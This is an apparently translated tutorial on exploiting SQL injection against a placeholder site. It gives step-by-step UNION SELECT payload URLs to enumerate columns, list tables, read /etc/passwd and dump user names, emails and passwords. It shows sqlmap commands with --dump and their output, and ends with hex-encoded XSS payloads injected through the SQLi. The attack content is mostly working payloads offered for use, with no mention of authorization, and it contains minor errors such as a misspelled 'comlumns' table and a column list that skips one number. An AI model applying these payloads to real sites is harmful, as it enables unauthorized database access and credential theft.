# INYECCIÓN SQLi - Basic 

## TOPICS

* [¿What is an sql injection?](#¿What-is-an-sql-injection?)
* [¿Why an sql error occurs?](#¿Why-an-sql-error-occurs?)
* [Sql injection types](#Sql-injection-types)
    * [Manual sql injection](#Manual-sql-injection)
      * [Detect a vulnerable page](#Detect-a-vulnerable-page)
      * [Detect the number of columns](#Detect-the-number-of-columns)
      * [Usando union select](#Using-union-select)
      * [Extract information](#Extract-information)
         * [mysql sql Injection Cheat Sheet](#mysql-sql-Injection-Cheat-Sheet)
      * [Extract personalized information](#Extract-personalized-information)
    * [Automated sql injection with sqlmap](#Automated-sql-injection-with-sqlmap)
      * [¿What is sqlmap?](#¿What-is-sqlmap?)
      * [Sqlmap installation](#Sqlmap-installation)
      * [Basic use of sqlmap](#Basic-use-of-sqlmap)
 
 * [Go from sql injection to xss injection](#Go-from-sql-injection-to-xss-injection)
    * [¿What is an xss injection?](#¿What-is-an-xss-injection?)
    * [Using hex to hide payloads](#Using-hex-to-hide-payloads)
 


## ¿What is an sql injection?

Sql Injection or SQL Injection is a vulnerability that allows the attacker to send or "inject" SQL instructions in a malicious and malicious way.

## ¿Why an sql error occurs?

An SQL error normally occurs with the bad filtering of the variables in a program that has or creates SQL, generally when you ask a user for inputs of any type and they are not validated, such as their name and password, but in exchange for this information the attacker sends an invasive SQL statement that will be executed against the database.

## Sql injection types

An sql injection can be exploited in 2 different ways, manually, that is, the attacker will inject the script by hand in order to generate the action within the database.

On the other hand we have the automated injection with sqlmap, sqlmap is a tool specially designed for this type of attack, it is in charge of analyzing the page, seeing if it is vulnerable and attacking, it is said that it is automated since the tool does everything by itself , the user only needs to enter the options they want to use to make the scan more effective.

## Manual sql injection 

### Detect a vulnerable page

One of the main things where we have to look to detect if a page is vulnerable to sql injection is in its parameters, let's imagine the following:

We find a common and current page which uses many parameters for the GET method (remember that the GET method is when the page sends the data using the URL), so we have something like this:

`http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1`

In this example we have 3 parameters, which are:

```
id=1
id2=1
id3=1
```

Now, to detect if the page is vulnerable, one of the simplest things is to use a simple 'at the end of each parameter to see if it generates an error in the database.

So we have the following:

We add a `` '' at the end of the first parameter, but it does not generate any error:

`http://www.paginaparaejemplo.com/algo.php?id=1'&id2=1&id3=1`

We add a `` '' at the end of the second parameter, but it does not generate any error:

`http://www.paginaparaejemplo.com/algo.php?id=1&id2=1'&id3=1`

We add a `` '' to the end of the last parameter, but here it returns an error:

`http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1'`

The page shows us a legend like this:

`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax`

Now that we have the vulnerable parameter, we move on to the following.

### Detect the number of columns

We already have the vulnerable parameter, now we have to identify the number of columns used by the page, for this we have the following commands:

`order by` y `group by`

Here we have to test the number of columns, here is an example of how to use the order by and the group by:

```
1' ORDER BY 1 --+	
1' ORDER BY 2 --+	
1' ORDER BY 3 --+	
1' ORDER BY 4 --+	
etc...
```
```
1' GROUP BY 1--+	
1' GROUP BY 2--+	
1' GROUP BY 3--+	
1' GROUP BY 4--+	
etc...
```

Here what we are looking for is that the page generates an error when injecting a number that exceeds the columns used by the page, to make it a little more understandable, we are going to see it this way:

We imagine that the page has `23` columns, going back to the previous example where we already discovered the vulnerable parameter, we would have something like this:

```

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 1 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 2 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 3 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 10 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 20 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 23 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 24 --+ #tenemos un error

```

When we exceed the number of columns used by the page, it will show us an error like the following:

`The query was not carried out: Unknown column '24' in 'order clause'`

Thanks to this, we found that the page uses 23 columns.

### Using union select

Now it is the turn of `union select`, what these commands do is" give way "so to speak to execute sentences directly in the database and that this is reflected on the page.

To use `union select`, we have to put the total columns that we discovered earlier. Returning to the example that we have raised, it would be as follows:

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
```

What that will generate is that the page shows us the numbers of the columns that are vulnerable to inject into them, this part is very important since we have to be very curious to notice the changes, in some cases the changes are very drastic and are they notice too much, but in other cases the changes are too subtle.

For this example, let's imagine the page is vulnerable on columns `3`,` 5`, and `20`. The page will show us these numbers somewhere.

### Extraer información 

Now that we have the number of columns and we have identified the injectable columns, continue to extract and inject information, to do that we need to inject directly into the vulnerable column, going to the previous example and knowing that column `5` is vulnerable, we will have something like this:

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,'soy vulnerable',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
```

By injecting `'I am vulnerable'` we are telling the page that we want column number 5 to show us the phrase` I am vulnerable` since we are injecting a string directly into the vulnerable column

Something that I highly recommend is to use `@@ datadir`, This shows us where the database is mounted, but at the same time we get our information with which we can determine which database it is using, let's imagine that we inject and it shows us this:

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,@@datadir,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
```
It shows us:

`/var/lib/mysql/`

This means that the database is in that path and at the same time it tells us that the database used is `mysql`, so we focus on that database.

#### mysql sql Injection Cheat Sheet

Knowing that the database with which the page is managed is `mysql`, we will see a small` Cheat Sheet` for this database.

What is a Cheat Sheet?

Basically it is a list with many "tricks" you can say, as is the Spanish translation of that phrase `Cheat Sheet = cheat sheet`. In this one we are going to find from the most basic queries to a little more advanced queries that will help us a lot to work on our sql injection.

```
|   Version   |  SELECT @@version o SELECT version()  | gives us the version of the database  |

| Current User | SELECT user() o SELECT system_user() | gives us the user we have |

| List Users | SELECT user FROM mysql.user | shows us all users |

| Database  | SELECT database() | shows us the database we are in |

| Lista de bases de datos | SELECT schema_name FROM information_schema.schemata | shows us the databases  |

| List tables | SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’ | shows us the tables of the chosen database |

| List Columns | SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’ | shows us the columns of the chosen table |

| Local File Access |  UNION ALL SELECT LOAD_FILE(‘/etc/passwd’)  | if possible, let us read system files |

| DB location | SELECT @@datadir | It shows us the address where the database is installed | 
 
```

### Extract personalized information

Now we are going to analyze in more detail how to get information from the database, returning to the example with which we are practicing, we are going to use `database ()`, which, as we have seen, helps us to show us the name of the database data with which we are working:

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,database(),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
```
It shows us:

`nombre_DB`

now we have the name of the database.

The next thing we are going to do is remove the tables from the database, here are 2 ways:

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,group_concat(table_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from information_schema.tables --+
```
It shows us:

`the main tables in the database information_schema`

To remove the tables from the database that we removed before: `name_db` we do the following:

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,group_concat(table_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from information_schema.tables where table_schema=database() --+
```

It shows us the main tables of the database `name_db`:

suppose we find the tables:

`usuarios, otra_tabla, hola_soy_otra_tabla`

logically the one that interests us is the table `usuarios`

Now we are going to enter the `users` table inside the` DB_name` database to get the columns:
```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,group_concat(column_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from information_schema.comlumns where table_name="usuarios" --+
```

It shows us:

`id, name, email, passwd`

which are generally the ones that can be found.

Now, to display the content of those columns: `id, name, email, passwd` we just have to remember which table they are in so we can call them, like this;

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,group_concat(id,name,email,passwd),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from usuarios --+
```
It shows us:

`0pepitopepito@correo.comcontraseñasegura`

If you realize it is all together because that is what we are calling it, to fix this we are going to make use of the `hex` encoding and the`:`symbol.

the symbol `:` in `hex` looks like this:` 0x3a`.

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,group_concat(id,0x3a,name,0x3a,email,0x3a,passwd),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from usuarios --+
```
It shows us:

`0:pepito:pepito@correo.com:contraseñasegura`

now more understandable.

## *As note* 

To perform these custom "attacks" we use a few things that I would like to explain:

1-`gruop_concat () `: This is a function that allows us to concatenate values, in such a way that we are using it to return the values that we choose from the selected table.

2-`group_concat (table_name) from information_schema.tables`: This statement returns the name of the tables (note that we are making use of `group_concat (table_name)`) from information_schema.tables, this means that we are making a statement that reflects the name of the tables that are inside the database called information_schema.

3-`group_concat (table_name) from information_schema.tables where table_schema = database () `: This sequence is very similar to the previous one, only another command is added here:` where` that is used to make the query a little more personalized , in this case we are using it to direct the query within the database called `DB_name`

## Automated sql injection with sqlmap

### ¿What is sqlmap?

SQLMap is a tool to exploit the SQL injection vulnerability. This tool automates the attack in order to exploit the page.

### Sqlmap installation

To start I would like to leave the official page here: `http://sqlmap.org/`

Sqlmap is a tool that works in python in its versions: 2.6, 2.7 and 3.x on all platforms, so there is no problem to use it, personally I have used it on windows, linux and termux and it works excellent on all of them.

The first thing we have to do is have git installed to be able to clone its official repository to our device, the git site is the following:

https://github.com/sqlmapproject/sqlmap.git

to clone it we use the following:

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

Once we have cloned the repository, we go to the `sqlmap-dev` folder and execute the` sqlmap.py` file:

`python sqlmap.py`




### Basic use of sqlmap

To see the help options for this tool, just use the following:

`sqlmap.py -h`

What will return the basic options to make a correct use of this tool, something that has to be understood well is the correct order of execution to add the options:

`sqlmap.py --opcion -u URL`

In the options we can highlight the most general and important, for example:

```
| --random-agent | Which allows us to "change" the user agent with which the queries are executed |

| --proxy=proxy | Which allows us to connect to the page we want to scan through a proxy |

| -p parametro | It is used to determine the parameter that we want to analyze |

| --level=1-5 | This allows us to modify the level with which we want to make the scan, by default it is in level 1 but we can change it up to 5 to make the scan more intrisive |

| --risk=1-3 | In the same way as --level, risk allows us to change the level with which we want to do the scan, adding more aggressiveness but at the same time making more noise, this can be configured from 1 to 3, coming by default at number 1 |

| --current-user | We extract the username with which we interact with the database |

| --current-db | It extracts the name of the database in which we are |

| --dbs | It will give us the number of databases and will show us the name of each of them |

| -D nombre | It allows us to enter the selected database |

| --tables | It will show us the number of tables within a database and the names of each of the tables |

| -T nombre | It allows us to enter the selected table | 

| --column | It will extract the number of columns within a table and show us the name of each of them |

| -C nombre | It allows us to select the column |

| --dump | It allows us to extract content from the database |

| --dump-all | It extracts everything from the database |


```

Once we know the basic options of the tool, we will see an example of how to use it:

`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1"`

Something very important to keep in mind is that sqlmap scans the page parameter by parameter, this means that if we have a page with more than one parameter we have to specify the port that we want to analyze or scan all one by one.


When you start the scan, it is divided into parts:

It will scan the connection to the page.
It will scan the page for any WAF or IPS:

` [INFO] checking if the target is protected by some kind of WAF/IPS` 

At the end of the scan, something like this will appear:

```
[*] starting at 12:10:33

[12:10:33] [INFO] resuming back-end DBMS 'mysql' 
[12:10:34] [INFO] testing connection to the target url
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: id
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: id=3 AND (SELECT 1489 FROM(SELECT COUNT(*),CONCAT(0x3a73776c3a,(SELECT (CASE WHEN (1489=1489) THEN 1 ELSE 0 END)),0x3a7a76653a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
---
[12:10:37] [INFO] the back-end DBMS is MySQL
web server operating system: FreeBSD
web application technology: Apache 2.2.22
back-end DBMS: MySQL 5

```
This means that the scan has finished, that the page is vulnerable and that we managed to attack it successfully. The following is to extract the name of the database, to extract the name of the databases we are going to use the `--dbs` option:

`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" --dbs`

When we finish we will have the names of the databases, something like this:

```
[*] starting at 12:12:56

[12:12:56] [INFO] resuming back-end DBMS 'mysql' 
[12:12:57] [INFO] testing connection to the target url
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: id
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: id3=1 AND (SELECT 1489 FROM(SELECT COUNT(*),CONCAT(0x3a73776c3a,(SELECT (CASE WHEN (1489=1489) THEN 1 ELSE 0 END)),0x3a7a76653a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
---
[12:13:00] [INFO] the back-end DBMS is MySQL
web server operating system: FreeBSD
web application technology: Apache 2.2.22
back-end DBMS: MySQL 5
[12:13:00] [INFO] fetching database names
[12:13:00] [INFO] the SQL query used returns 2 entries
[12:13:00] [INFO] resumed: information_schema
[12:13:00] [INFO] resumed: nombre_DB
available databases [2]:
[*] information_schema
[*] nombre_DB
```

With this we have the databases, in this example we have `2`:

```
[*] information_schema
[*] nombre_DB
```

Now, we are going to enter the database `name_db` and extract the name of the tables:

`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" -D nombre_DB --tables`

At the end of the scan we have something like this:

```
[11:55:18] [INFO] the back-end DBMS is MySQL
web server operating system: FreeBSD
web application technology: Apache 2.2.22
back-end DBMS: MySQL 5
[11:55:18] [INFO] fetching tables for database: 'nombre_DB'
[11:55:19] [INFO] heuristics detected web page charset 'ascii'
[11:55:19] [INFO] the SQL query used returns 3 entries
[11:55:20] [INFO] retrieved: usuarios
[11:55:21] [INFO] retrieved: otra_tabla
[11:55:21] [INFO] retrieved: hola_soy_otra_tabla
```

At the end we have the following tables:

`usuarios, otra_tabla, hola_soy_otra_tabla`

The next thing is to select a table and extract the columns within it:

`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" -D nombre_DB -T usuarios --columns`

At the end we have something like this:

```
[12:17:39] [INFO] the back-end DBMS is MySQL
web server operating system: FreeBSD
web application technology: Apache 2.2.22
back-end DBMS: MySQL 5
[12:17:39] [INFO] fetching columns for table 'users' in database 'safecosmetics'
[12:17:41] [INFO] heuristics detected web page charset 'ascii'
[12:17:41] [INFO] the SQL query used returns 4 entries
[12:17:42] [INFO] retrieved: id
[12:17:43] [INFO] retrieved: int(11)                                                                                         
[12:17:45] [INFO] retrieved: name                                                                                            
[12:17:46] [INFO] retrieved: text                                                                                            
[12:17:47] [INFO] retrieved: passwd                                                                                        
[12:17:48] [INFO] retrieved: text                                                                                            

.......

[12:17:59] [INFO] retrieved: hash
[12:18:01] [INFO] retrieved: varchar(128)
Database: nombre_DB
Table: users
[8 columns]
+-------------------+--------------+
| Column            | Type         |
+-------------------+--------------+
| email             | text         |
| id                | int(11)      |
| name              | text         |
| passwd            | text         |
+-------------------+--------------+
```

We have the following columns:

`id, name, email, passwd`

Finally we have to extract the content of those columns:

`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" -D nombre_DB -T usuarios -C id,name,email,passwd --dump `

At the end we have something like this:

```
+----+----------+---------------------+-------------------+
| id | name     | email               |      password     |
+----+----------+---------------------+-------------------+
| 0  | pepito   | pepito@correo.com   | contraseñasegura  |
+----+----------+---------------------+-------------------+

```

With this we have already extracted the information that is inside the columns.


## Go from sql injection to xss injection

Now that we have seen how to do an sql injection "attack", let's move from one vulnerability to another, this will be an xss injection. All pages that are vulnerable to sql injection are also vulnerable to xss injection.

### ¿What is an xss injection?

This "attack" consists of injecting malicious code into benign web pages. The attacker injects code from the client side, so that due to a bad configuration of the web page, this code is shown to other users.

### Using hex to hide payloads

The hexadecimal system is a method of positional numbering that uses the number 16 (Base-16) as a base, that is, there are 16 possible digit symbols.

Their numbers are represented by the first 10 digits of the decimal numbering and the range from the number 10 to the number 15 is represented by the letters of the alphabet: A, B, C, D, E and F.

This is the method with which we are going to inject xss into a sql vulnerability, taking up the example of the vulnerable page we would have something like this:

In the same way, we are going to make use of the vulnerable column, in this case let's remember that column `5` is vulnerable.

To convert strings to hex there are many tools and many pages that allow us to do that, one of them is this:

https://www.convertstring.com/es/EncodeDecode/HexEncode


a very basic xss injection payload is the following:

`<script>alert(1)</script>` 

in hex it looks like this:

`3C7363726970743E616C6572742831293C2F7363726970743E`

and when injecting like this:

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,3C7363726970743E616C6572742831293C2F7363726970743E,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
```
It shows us:

`an error`

why?? well, the page shows us the error since it cannot read the string in hex like this, so that it reads it correctly we have to add `0x` at the beginning of the string converted to hex, in this way we are telling it to the page that we want that through that vulnerable column we execute that string in `hex`, like this:

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,0x3C7363726970743E616C6572742831293C2F7363726970743E,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
```
It shows us:

`an alert`

Ready, this way we are going to an xss injection within a sql injection.


